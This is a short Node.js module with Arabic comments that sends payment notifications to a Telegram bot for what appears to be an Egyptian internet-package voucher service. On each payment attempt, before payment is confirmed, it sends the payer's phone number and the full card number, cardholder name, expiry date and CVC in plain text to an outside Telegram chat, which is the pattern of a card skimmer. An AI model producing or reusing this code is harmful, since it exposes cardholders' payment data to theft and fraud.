const axios = require("axios");

async function sendTelegramMessage(data, isInitial = true) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    let message = "";
    const method = data.payment_method || data.source_type || "محفظة / دفع إلكتروني";
    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : "غير محدد";

    if (isInitial) {
      // الرسالة الأولى (تنبيه بالطلب أو البيانات المدخلة قبل الدفع)
      message = `🔔 **تنبيه محاولة دفع جديدة**\n\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ: <b>${amountEGP} جنيه</b>\n`;

      if (data.phone && data.phone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${data.phone}</code>\n`;
      }

      // تفاصيل البطاقة إن وجدت
      if (data.card_data && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية</b> ---\n` +
                  `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                  `👤 الاسم: ${data.card_data.name}\n` +
                  `📅 الانتهاء: ${data.card_data.expiry}\n` +
                  `🔒 CVC: ${data.card_data.cvc}\n`;
      }
    } else {
      // الرسالة الثانية (تأكيد نجاح الدفع من الـ Webhook)
      const txnId = data.id || "غير متوفر";
      const voucher = data.voucher_code || "غير متوفر";
      const packageInfo = data.package_info || "باقة إنترنت";

      message = `✅ **تم تأكيد عملية الدفع بنجاح!**\n\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 الباقة: ${packageInfo}\n` +
                `🎟️ كارت الشحن المولد: <code>${voucher}</code>\n`;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ خطأ في إرسال رسالة تليجرام:", err.response?.data || err.message);
  }
}

module.exports = { sendTelegramMessage };
